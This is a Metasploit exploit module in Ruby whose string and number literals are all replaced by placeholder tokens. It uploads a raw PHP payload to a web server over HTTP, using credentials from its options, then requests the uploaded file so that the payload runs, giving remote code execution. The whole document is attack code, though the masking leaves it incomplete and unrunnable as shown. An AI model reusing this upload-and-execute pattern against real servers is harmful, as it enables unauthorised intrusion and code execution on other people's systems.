require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: EXE def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > <str> , <str> = > ARCH_PHP , <str> = > [ [ <str> , { } ] , ] , <str> = > <str> , <str> = > <int> ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) ] , self . class ) end def exploit uri = build_path print_status <str> uri <str> res = send_request_cgi ( { <str> = > uri , <str> = > <str> , <str> = > payload . raw , <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] } , <int> ) unless ( res and res . code == <int> ) print_error <str> return end print_status <str> res = send_request_cgi ( { <str> = > uri , <str> = > <str> } , <int> ) end def build_path uri_path = normalize_uri ( datastore [ <str> ] ) uri_path << <str> unless uri_path . ends_with? ( <str> ) if datastore [ <str> ] uri_path << datastore [ <str> ] uri_path << <str> unless uri_path . ends_with? ( <str> ) else uri_path << Rex :: Text . rand_text_alphanumeric ( <int> ) uri_path << <str> end return uri_path end end 
